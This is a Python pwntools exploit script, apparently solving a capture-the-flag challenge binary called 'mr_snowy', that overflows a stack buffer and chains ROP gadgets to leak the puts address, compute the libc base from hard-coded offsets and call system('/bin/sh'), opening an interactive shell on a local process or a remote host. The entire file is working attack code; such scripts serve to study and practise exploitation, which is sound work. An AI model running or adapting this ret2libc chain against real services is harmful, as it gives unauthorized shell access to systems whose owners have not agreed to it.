from pwn import *
import sys


class BOFWithROP:
    '''
    Based on another write-up
    Link: https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/
    '''
    def send_payload(self, payload):
        # Send the payload
        self.r.sendlineafter('>', b'1')
        self.r.sendlineafter('>', payload)

    def leak_puts(self):
        # Create the buffer
        payload = b'A'*72
        # Find address of puts in plt
        plt_puts = self.binary.plt['puts']
        # Find address of got in plt
        got_puts = self.binary.got['puts']
        # Find address of main in symbols
        main_addr = self.binary.symbols['main']
        # Find pop rdi gadget to assign first argument to syscall
        self.pop_rdi = (self.rop_binary.find_gadget(['pop rdi', 'ret']))[0]
        # Create a payload
        payload += p64(self.pop_rdi)
        payload += p64(got_puts)
        payload += p64(plt_puts)
        payload += p64(main_addr)
        self.send_payload(payload)
        self.r.recvline()
        self.r.recvline()
        # Receive an address of leaked puts
        leak = self.r.recvline().strip()
        puts_addr = u64(leak.ljust(0x8, b"\x00"))
        return puts_addr

    def create_shell(self, puts_addr):
        # info("Puts address: 0x%x" % puts_addr)
        # https://libc.blukat.me/?q=puts%3Aaa0&l=libc6_2.27-3ubuntu1.4_amd64
        # From the site above determine the offset inside libc
        libc_base = puts_addr - 0x080aa0
        # Now, when we know the base address of libc, we can simply find needed gadgets
        system_addr = libc_base + 0x04f550
        bin_sh_addr = libc_base + 0x1b3e1a
        ret_addr = (self.rop_binary.find_gadget(['ret']))[0]
        # Again create a payload
        payload = b'A' * 72
        payload += p64(ret_addr)
        payload += p64(self.pop_rdi)
        payload += p64(bin_sh_addr)
        payload += p64(system_addr)
        # And send it
        self.send_payload(payload)
        self.r.interactive()

    def exploit(self):
        REMOTE = True if sys.argv[1] and sys.argv[2] else False
        binary_path = './mr_snowy'
        self.binary = ELF(binary_path)
        if REMOTE:
            self.r = remote(sys.argv[1], int(sys.argv[2]))
        else:
            self.r = process(binary_path)
        # Create object to search ROP gadgets
        self.rop_binary = ROP(self.binary)
        puts_addr = self.leak_puts()
        self.create_shell(puts_addr)


def main():
    bwr = BOFWithROP()
    bwr.exploit()


if __name__=='__main__':
    main()
